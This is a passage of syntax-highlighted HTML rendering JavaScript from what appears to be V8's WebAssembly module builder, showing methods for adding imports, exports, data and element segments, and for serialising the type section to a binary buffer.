punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addImportedTag</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Imported tags must be declared before local ones"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTag<span class="token punctuation">,</span>            <span class="token literal-property property">type_index</span><span class="token operator">:</span> type_index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addExport</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalFunction<span class="token punctuation">,</span>            <span class="token literal-property property">index</span><span class="token operator">:</span> index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addExportOfKind</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> kind<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>            index <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span>            kind <span class="token operator">!=</span> kExternalTable <span class="token operator">&amp;&amp;</span>            kind <span class="token operator">!=</span> kExternalMemory          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Index for exports other than tables/memories must be provided"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> index <span class="token operator">!=</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Index for exports must be a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token literal-property property">kind</span><span class="token operator">:</span> kind<span class="token punctuation">,</span> <span class="token literal-property property">index</span><span class="token operator">:</span> index <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">setCompilationHint</span><span class="token punctuation">(</span><span class="token parameter">strategy<span class="token punctuation">,</span> baselineTier<span class="token punctuation">,</span> topTier<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>compilation_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">strategy</span><span class="token operator">:</span> strategy<span class="token punctuation">,</span>            <span class="token literal-property property">baselineTier</span><span class="token operator">:</span> baselineTier<span class="token punctuation">,</span>            <span class="token literal-property property">topTier</span><span class="token operator">:</span> topTier<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// TODO(manoskouk): Refactor this to use initializer expression for &#123;offset&#125;.</span>        <span class="token function">addDataSegment</span><span class="token punctuation">(</span><span class="token parameter">offset<span class="token punctuation">,</span> data<span class="token punctuation">,</span> is_global <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> memory_index <span class="token operator">=</span> <span class="token number">0</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">offset</span><span class="token operator">:</span> offset<span class="token punctuation">,</span>            <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>            <span class="token literal-property property">is_global</span><span class="token operator">:</span> is_global<span class="token punctuation">,</span>            <span class="token literal-property property">is_active</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">mem_index</span><span class="token operator">:</span> memory_index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addPassiveDataSegment</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span> <span class="token literal-property property">is_active</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">exportMemoryAs</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> memory_index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>memory_index <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> num_memories <span class="token operator">=</span>              <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">+</span>              <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num_memories <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>                <span class="token string">"Pass memory index to 'exportMemoryAs' if there is not exactly "</span> <span class="token operator">+</span>                  <span class="token string">"one memory imported or declared."</span>              <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            memory_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalMemory<span class="token punctuation">,</span>            <span class="token literal-property property">index</span><span class="token operator">:</span> memory_index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// &#123;offset&#125; is a constant expression.</span>        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>        <span class="token comment">// they are constant expressions.</span>        <span class="token function">addActiveElementSegment</span><span class="token punctuation">(</span><span class="token parameter">table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">checkExpr</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>        <span class="token comment">// they are constant expressions.</span>        <span class="token function">addPassiveElementSegment</span><span class="token punctuation">(</span><span class="token parameter">elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>        <span class="token comment">// they are constant expressions.</span>        <span class="token function">addDeclarativeElementSegment</span><span class="token punctuation">(</span><span class="token parameter">elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">appendToTable</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> n <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> n <span class="token operator">!=</span> <span class="token string">"number"</span><span class="token punctuation">)</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>                <span class="token string">"invalid table (entries have to be numbers): "</span> <span class="token operator">+</span> array              <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addTable</span><span class="token punctuation">(</span>kWasmAnyFunc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Adjust the table to the correct size.</span>          <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">const</span> base <span class="token operator">=</span> table<span class="token punctuation">.</span>initial_size<span class="token punctuation">;</span>          <span class="token keyword">const</span> table_size <span class="token operator">=</span> base <span class="token operator">+</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          table<span class="token punctuation">.</span>initial_size <span class="token operator">=</span> table_size<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max <span class="token operator">&amp;&amp;</span> table_size <span class="token operator">></span> table<span class="token punctuation">.</span>max_size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            table<span class="token punctuation">.</span>max_size <span class="token operator">=</span> table_size<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addActiveElementSegment</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">,</span> array<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">setTableBounds</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token keyword">undefined</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"The table bounds of table '0' have already been set."</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addTable</span><span class="token punctuation">(</span>kWasmAnyFunc<span class="token punctuation">,</span> min<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token literal-property property">size</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Did not start a recursive group before ending one"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> last_element <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>last_element<span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Did not start a recursive group before ending one"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          last_element<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> last_element<span class="token punctuation">.</span>start<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">setName</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token parameter">debug <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> typeToBuffer <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> binary <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> wasm <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>          <span class="token comment">// Add header.</span>          binary<span class="token punctuation">.</span><span class="token function">emit_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">const</span> headerLen <span class="token operator">=</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token comment">// Add type section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting types @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTypeSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              <span class="token keyword">let</span> length_with_groups <span class="token operator">=</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> group <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                length_with_groups <span class="token operator">-=</span> group<span class="token punctuation">.</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>length_with_groups<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">let</span> rec_group_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>                  rec_group_index <span class="token operator">&lt;</span> wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span>                  wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span>rec_group_index<span class="token punctuation">]</span><span class="token punctuation">.</span>start <span class="token operator">==</span> i                <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmRecursiveTypeGroupForm<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span>rec_group_index<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  rec_group_index<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">let</span> type <span class="token operator">=</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span>supertype <span class="token operator">!=</span> kNoSuperType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>                    type<span class="token punctuation">.</span>is_final <span class="token operator">?</span> kWasmSubtypeFinalForm <span class="token operator">:</span> kWasmSubtypeForm                  <span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// supertype count</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>supertype<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span>is_final<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmSubtypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// no supertypes</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">WasmStruct</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmStructTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>fields<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> field <span class="token keyword">of</span> type<span class="token punctuation">.</span>fields<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>mutability <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">WasmArray</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmArrayTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>mutability <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmFunctionTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> param <span class="token keyword">of</span> type<span class="token punctuation">.</span>params<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>results<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token 